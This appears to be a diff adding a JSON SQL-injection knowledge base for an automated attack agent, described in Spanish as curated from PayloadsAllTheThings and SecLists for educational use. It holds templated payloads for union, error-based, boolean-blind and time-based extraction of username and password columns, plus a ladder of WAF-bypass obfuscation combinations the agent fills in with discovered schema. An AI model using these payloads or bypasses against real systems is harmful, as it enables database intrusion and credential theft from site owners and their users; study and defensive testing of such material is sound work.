@@ -1,0 +1,42 @@
+{
+  "_about": "Base de conocimiento SQLi del agente. El agente se ALIMENTA de estas plantillas/recetas y a la vez GENERA sus payloads rellenandolas con el esquema que descubre. Fuente: curado de PayloadsAllTheThings (SQL Injection) y SecLists, para uso educativo/investigacion.",
+  "_sources": [
+    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection",
+    "https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/SQLi"
+  ],
+  "extraction_techniques": {
+    "union": [
+      "-1{q} UNION SELECT {ucol},{pcol} FROM {table}-- -",
+      "-1{q} UNION SELECT group_concat({ucol},0x3a,{pcol}),2 FROM {table}-- -"
+    ],
+    "error-based": [
+      "1{q} AND extractvalue(1,concat(0x7e,(SELECT concat({ucol},0x3a,{pcol}) FROM {table} LIMIT 1)))-- -",
+      "1{q} AND updatexml(1,concat(0x7e,(SELECT {pcol} FROM {table} LIMIT 1)),1)-- -"
+    ],
+    "boolean-blind": [
+      "1{q} AND substring((SELECT {pcol} FROM {table} LIMIT 1),{i},1)={ch}-- -",
+      "1{q} AND ascii(substring((SELECT {pcol} FROM {table} LIMIT 1),{i},1))>{n}-- -"
+    ],
+    "time-based": [
+      "1{q} AND IF(substring((SELECT {pcol} FROM {table} LIMIT 1),{i},1)={ch},sleep(2),0)-- -",
+      "1{q} AND IF(ascii(substring((SELECT {pcol} FROM {table} LIMIT 1),{i},1))>{n},sleep(2),0)-- -"
+    ]
+  },
+  "waf_bypass_ladder": [
+    [],
+    ["case"],
+    ["inline_comment"],
+    ["inline_comment", "case"],
+    ["union_all", "case"],
+    ["union_all", "inline_comment", "case"],
+    ["versioned_comment"],
+    ["versioned_comment", "case"],
+    ["term_hash", "inline_comment", "case"],
+    ["whitespace_tab"],
+    ["whitespace_newline"],
+    ["whitespace_tab", "case"],
+    ["union_all", "versioned_comment", "case"],
+    ["double_keyword"],
+    ["double_keyword", "inline_comment", "case"]
+  ]
+}
